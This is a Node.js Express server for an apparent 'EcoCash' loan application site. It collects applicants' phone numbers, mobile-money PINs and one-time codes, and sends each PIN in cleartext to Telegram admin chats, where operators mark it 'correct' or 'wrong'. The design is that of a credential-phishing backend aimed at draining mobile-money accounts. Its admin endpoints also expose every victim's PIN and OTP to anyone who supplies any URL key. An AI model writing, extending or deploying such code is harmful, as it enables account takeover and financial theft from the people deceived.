require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

const APP_URL = process.env.APP_URL || 'https://ecocash-aot6.onrender.com';

// Designate main admin key (has broadcast permissions)
const MAIN_ADMIN_KEY = 'main'; 

// Pre-configured Admin Accounts (Add new admin IDs/Keys here)
const ADMINS = [
  { key: 'main', name: 'Main Admin', chatId: process.env.ADMIN_1_CHAT_ID, isMain: true },
  { key: 'admin1', name: 'Admin 001', chatId: process.env.ADMIN_2_CHAT_ID, isMain: false },
  { key: 'admin2', name: 'Admin 002', chatId: process.env.ADMIN_3_CHAT_ID, isMain: false }
];

const activeApplications = new Map();

function formatZimbabwePhone(phone) {
  let formattedPhone = phone || '';
  if (formattedPhone.startsWith('+263')) formattedPhone = formattedPhone.replace('+263', '');
  else if (formattedPhone.startsWith('263')) formattedPhone = formattedPhone.slice(3);
  else if (formattedPhone.startsWith('0')) formattedPhone = formattedPhone.slice(1);
  return formattedPhone;
}

// -------------------------------------------------------------
// TELEGRAM WEBHOOK HANDLER (/start command + Callbacks)
// -------------------------------------------------------------
app.post('/api/telegram-webhook', async (req, res) => {
  res.sendStatus(200); // Quick acknowledge to Telegram

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;

  const { message, callback_query } = req.body;

  // 1. HANDLE /start COMMAND
  if (message && message.text && message.text.startsWith('/start')) {
    const chatId = message.chat.id;
    const firstName = message.from.first_name || 'Admin';
    const username = message.from.username ? `@${message.from.username}` : 'Not set';

    // Check if chatId belongs to a registered admin
    let matchedAdmin = ADMINS.find(a => a.chatId && String(a.chatId) === String(chatId));
    
    // Default fallback link if Chat ID isn't linked to an environment variable yet
    const adminKey = matchedAdmin ? matchedAdmin.key : `admin-${chatId.toString().slice(-4)}`;
    const adminName = matchedAdmin ? matchedAdmin.name : firstName;
    const privateLink = `${APP_URL}/admin/${encodeURIComponent(adminKey)}`;

    const welcomeMsg = `🤖 <b>WELCOME TO ECOCASH ADMIN BOT</b>\n\n` +
                       `👤 <b>User Info:</b>\n` +
                       `• <b>Name:</b> ${firstName}\n` +
                       `• <b>Username:</b> ${username}\n` +
                       `• <b>Chat ID:</b> <code>${chatId}</code>\n` +
                       `• <b>Role:</b> ${matchedAdmin?.isMain ? 'Main Administrator' : 'Portal Administrator'}\n\n` +
                       `🔗 <b>YOUR PRIVATE DASHBOARD LINK:</b>\n` +
                       `${privateLink}\n\n` +
                       `<i>Use the link above to manage applicant approvals independently.</i>`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: welcomeMsg,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🌐 Open Private Dashboard', url: privateLink }]
            ]
          }
        })
      });
    } catch (err) {
      console.error("Error sending Telegram /start response:", err.message);
    }
  }

  // 2. HANDLE CALLBACK BUTTONS (PIN / OTP approvals via Telegram)
  if (callback_query) {
    const actionData = callback_query.data;
    const chatId = callback_query.message.chat.id;
    const messageId = callback_query.message.message_id;

    if (actionData.startsWith('pin_correct_')) {
      const ref = actionData.replace('pin_correct_', '');
      if (activeApplications.has(ref)) {
        const app = activeApplications.get(ref);
        app.status = 'PIN_APPROVED';
        activeApplications.set(ref, app);
      }
      await editMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🟢 <b>STATUS: PIN Marked as CORRECT ✅</b>`);
    }

    if (actionData.startsWith('pin_wrong_')) {
      const ref = actionData.replace('pin_wrong_', '');
      if (activeApplications.has(ref)) {
        const app = activeApplications.get(ref);
        app.status = 'PIN_REJECTED';
        activeApplications.set(ref, app);
      }
      await editMessage(botToken, chatId, messageId, `${callback_query.message.text}\n\n🔴 <b>STATUS: PIN Marked as WRONG ❌</b>`);
    }
  }
});

async function editMessage(botToken, chatId, messageId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
    });
  } catch (err) {
    console.error("Edit message error:", err.message);
  }
}

// -------------------------------------------------------------
// BROADCAST API: Main Admin Only
// -------------------------------------------------------------
app.post('/api/admin/:adminKey/broadcast', async (req, res) => {
  const { adminKey } = req.params;
  const { message } = req.body;

  if (adminKey !== MAIN_ADMIN_KEY) {
    return res.status(403).json({ success: false, error: "Unauthorized: Only Main Admin can send broadcasts." });
  }

  if (!message || message.trim() === '') {
    return res.status(400).json({ success: false, error: "Broadcast message cannot be empty." });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return res.status(500).json({ success: false, error: "Bot token missing." });

  const broadcastText = `📢 <b>SYSTEM BROADCAST FROM MAIN ADMIN</b>\n\n${message}`;

  let sentCount = 0;
  for (const admin of ADMINS) {
    if (!admin.chatId) continue;
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: admin.chatId,
          text: broadcastText,
          parse_mode: 'HTML'
        })
      });
      sentCount++;
    } catch (err) {
      console.error(`Broadcast failed for ${admin.name}:`, err.message);
    }
  }

  res.json({ success: true, message: `Broadcast delivered to ${sentCount} active admins.` });
});

// Notify admins about new loan applications
async function notifyAdminsSeparately(appData, appReference) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;

  for (const admin of ADMINS) {
    if (!admin.chatId) continue;

    const privateLink = `${APP_URL}/admin/${encodeURIComponent(admin.key)}`;

    const messageText = `🔑 <b>NEW LOAN APPLICATION RECEIVED</b>\n\n` +
                        `👤 <b>Assigned To:</b> ${admin.name}\n` +
                        `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                        `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                        `💵 <b>Amount:</b> $${appData.loanAmount || 'N/A'}\n` +
                        `🔑 <b>PIN:</b> <code>${appData.pin || 'N/A'}</code>\n\n` +
                        `🔗 <b>Private Portal:</b>\n${privateLink}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: admin.chatId,
          text: messageText,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '❌ Wrong PIN', callback_data: `pin_wrong_${appReference}` },
                { text: '✅ Correct PIN', callback_data: `pin_correct_${appReference}` }
              ],
              [
                { text: '🌐 Open Private Dashboard', url: privateLink }
              ]
            ]
          }
        })
      });
    } catch (err) {
      console.error(`Failed to notify ${admin.name}:`, err.message);
    }
  }
}

// STEP 2: Apply Loan Endpoint
app.post('/api/apply-loan', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);
    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;

    const appData = {
      ...data,
      formattedPhone,
      status: 'PENDING_PIN',
      history: []
    };

    activeApplications.set(appReference, appData);
    await notifyAdminsSeparately(appData, appReference);

    res.status(201).json({ success: true, appReference });
  } catch (error) {
    console.error("Submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// STEP 3: Submit OTP Endpoint
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { appReference, otpCode } = req.body;

    if (activeApplications.has(appReference)) {
      const appData = activeApplications.get(appReference);
      appData.status = 'PENDING_OTP';
      appData.otpCode = otpCode;
      activeApplications.set(appReference, appData);
    }

    res.status(200).json({ success: true, message: "OTP received" });
  } catch (error) {
    console.error("OTP Error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});

// PRIVATE ADMIN API: Fetch applications for a dashboard link
app.get('/api/admin/:adminKey/applications', (req, res) => {
  const { adminKey } = req.params;
  
  // Allow configured keys or dynamic admin keys
  let admin = ADMINS.find(a => a.key === adminKey);
  const isMain = adminKey === MAIN_ADMIN_KEY;

  const list = Array.from(activeApplications.entries()).map(([ref, data]) => ({
    reference: ref,
    ...data
  }));

  res.json({
    success: true,
    adminName: admin ? admin.name : `Admin (${adminKey})`,
    isMainAdmin: isMain,
    applications: list
  });
});

// PRIVATE ADMIN API: Update status
app.post('/api/admin/:adminKey/update-status', (req, res) => {
  const { adminKey } = req.params;
  const { appReference, newStatus } = req.body;

  if (!activeApplications.has(appReference)) {
    return res.status(404).json({ success: false, error: "Application not found" });
  }

  const appData = activeApplications.get(appReference);
  appData.status = newStatus;
  appData.history.push({
    updatedBy: adminKey,
    status: newStatus,
    timestamp: new Date().toISOString()
  });

  activeApplications.set(appReference, appData);

  res.json({ success: true, status: newStatus });
});

// STATUS CHECK ENDPOINT
app.get('/api/check-status/:appReference', (req, res) => {
  const { appReference } = req.params;
  const appData = activeApplications.get(appReference);

  if (!appData) {
    return res.status(404).json({ success: false, status: 'NOT_FOUND' });
  }

  res.json({ success: true, status: appData.status });
});

// ROUTE: Render private admin portal page
app.get('/admin/:adminKey', (req, res) => {
  res.sendFile(path.join(publicPath, 'admin.html'));
});

app.get('*', (req, res) => {
  res.sendFile(path.join(publicPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
    
